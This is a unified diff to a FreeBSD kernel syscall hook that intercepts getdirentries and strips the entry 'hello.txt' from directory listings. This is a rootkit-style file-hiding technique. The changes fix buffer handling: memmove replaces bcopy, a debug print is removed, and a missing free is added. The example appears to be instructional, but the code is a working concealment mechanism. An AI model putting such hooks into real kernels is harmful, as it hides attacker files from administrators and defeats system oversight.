@@ -15,13 +15,13 @@ getdirentries_hook(struct thread* td, void* syscall_args)
 {
 	struct dirent* dp;
 	struct dirent* current;
-	unsigned int size, count;
 	struct getdirentries_args* /* {
 		int	fd;
 		char*	buf;
 		size_t	nbytes;
 		off_t*	basep;
-	}  */ uap;
+	} */ uap;
+	unsigned int size, count;
 
 	sys_getdirentries(td, syscall_args);
 	size = td->td_retval[0];
@@ -56,18 +56,20 @@ getdirentries_hook(struct thread* td, void* syscall_args)
 		 */
 		while ((current->d_reclen != 0) && (count > 0))
 		{
-			uprintf("%s\n", current->d_name);
 			count -= current->d_reclen;
 
 			/* Check if this is a file we want to hide */
-			if(strncmp(current->d_name, "hello.txt", current->d_namlen) == 0)
+			if(strcmp(current->d_name, "hello.txt") == 0)
 			{
-				/* Copy the next entry over this current entry */
-				bcopy((char*)current + current->d_reclen, current, count);
-
 				/* Decrease the size to accomodate for the missing entry */
 				size -= current->d_reclen;
 				td->td_retval[0] = size;
+
+				/*
+				 * Copy the next entry over this current entry and copy this back
+				 * to the userland buffer
+				 */
+				memmove(current, (unsigned char*)current + current->d_reclen, count);
 				copyout(dp, uap->buf, size);
 				break;
 			}
@@ -76,6 +78,7 @@ getdirentries_hook(struct thread* td, void* syscall_args)
 			if (count != 0)
 				current = (struct dirent*)((char*)current + current->d_reclen);
 		}
+		free(dp, M_TEMP);
 	}
 
 	return 0;
